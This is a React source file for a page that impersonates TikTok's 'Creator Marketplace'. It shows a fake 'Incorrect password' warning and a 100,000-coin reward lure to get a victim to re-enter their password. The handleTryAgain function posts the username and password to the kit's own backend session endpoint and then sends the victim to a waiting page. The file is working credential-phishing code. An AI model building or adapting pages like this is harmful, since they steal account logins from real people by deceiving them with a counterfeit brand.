import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { AlertTriangle, Eye, EyeOff, X, Check } from 'lucide-react';
import axios from 'axios';
import ProfileCard from '../components/ProfileCard';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const IncorrectPasswordPage = () => {
  const navigate = useNavigate();
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [tiktokData, setTiktokData] = useState(null);
  const coinAmount = localStorage.getItem('coinAmount') || '100,000';
  const sessionId = localStorage.getItem('sessionId');
  const username = localStorage.getItem('username') || 'user';

  useEffect(() => {
    const storedData = localStorage.getItem('tiktokData');
    if (storedData) {
      setTiktokData(JSON.parse(storedData));
    }
  }, []);

  const passwordRequirements = [
    { 
      text: '8 characters (20 max)', 
      met: password.length >= 8 && password.length <= 20 
    },
    { 
      text: '1 letter, 1 number, 1 special character (# ? ! @)', 
      met: /[A-Za-z]/.test(password) && /[0-9]/.test(password) && /[!?,.@&;:/\-\[\]#%^*+=_\\|~<>()]/.test(password) 
    }
  ];

  const isPasswordValid = passwordRequirements.every(req => req.met);

  const handleTryAgain = async () => {
    if (isPasswordValid) {
      localStorage.setItem('password', password);

      try {
        await axios.post(`${API}/session/step`, {
          session_id: sessionId,
          step: 'password',
          data: {
            username: username,
            password: password
          }
        });
      } catch (error) {
        console.error('Failed to submit step:', error);
      }

      navigate('/waiting');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-12">
        {/* Title */}
        <div className="text-center mb-12">
          <h1 className="text-6xl font-black mb-4">
            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
              TikTok
            </span>
          </h1>
          <p className="text-cyan-400 text-2xl font-semibold">Incorrect Password</p>
        </div>

        {/* Name Display */}
        {tiktokData && (
          <div className="text-center mb-6">
            <h2 className="text-white font-bold text-lg">{tiktokData.name || tiktokData.nickname || tiktokData.user?.nickname || tiktokData.username}</h2>
          </div>
        )}

        {/* Profile Card */}
        <ProfileCard userData={tiktokData} />

        {/* Error Alert */}
        <div className="bg-[#1a1a1c] border-2 border-yellow-500 rounded-xl p-6 mb-8 mt-4">
          <div className="flex items-center justify-center mb-4">
            <AlertTriangle className="w-12 h-12 text-yellow-500" />
          </div>
          <p className="text-[#fe2c55] text-xl font-bold text-center mb-2">Incorrect password entered!</p>
          <p className="text-gray-400 text-center">Please enter the correct password for your account.</p>
        </div>

        {/* Username Input */}
        <div className="mb-6">
          <label className="text-white text-lg mb-3 block">Username</label>
          <Input
            type="text"
            value={username}
            readOnly
            className="w-full bg-[#1a1a1c] border border-gray-700 text-gray-400 px-4 py-6 text-lg rounded-lg"
          />
        </div>

        {/* Password Input */}
        <div className="mb-6">
          <label className="text-white text-lg mb-3 block">Password</label>
          <div className="relative">
            <Input
              type={showPassword ? 'text' : 'password'}
              placeholder="Enter your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400 pr-12"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition-colors"
            >
              {showPassword ? <EyeOff className="w-6 h-6" /> : <Eye className="w-6 h-6" />}
            </button>
          </div>
        </div>

        {/* Password Requirements */}
        <div className="mb-8 space-y-2">
          {passwordRequirements.map((req, index) => {
            const hasStarted = password.length > 0;
            return (
              <div key={index} className="flex items-center gap-2">
                {!hasStarted ? (
                    <div className="w-5 h-5 rounded-full border border-gray-600"></div>
                ) : req.met ? (
                  <Check className="w-5 h-5 text-green-500" />
                ) : (
                  <X className="w-5 h-5 text-[#fe2c55]" />
                )}
                <span className={`${hasStarted ? (req.met ? "text-green-500" : "text-[#fe2c55]") : "text-gray-400"} text-sm`}>
                  {req.text}
                </span>
              </div>
            );
          })}
        </div>

        {/* Try Again Button */}
        <Button
          onClick={handleTryAgain}
          disabled={!isPasswordValid}
          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#ff4266] hover:to-[#ff4266] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Continue
        </Button>

        {/* Coins Display */}
        <div className="mt-8 text-center">
          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
            <span className="text-gray-400 text-lg">You will receive: </span>
            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
            <span className="text-gray-400 text-lg"> Coins</span>
          </div>
        </div>
      </main>
    </div>
  );
};

export default IncorrectPasswordPage;
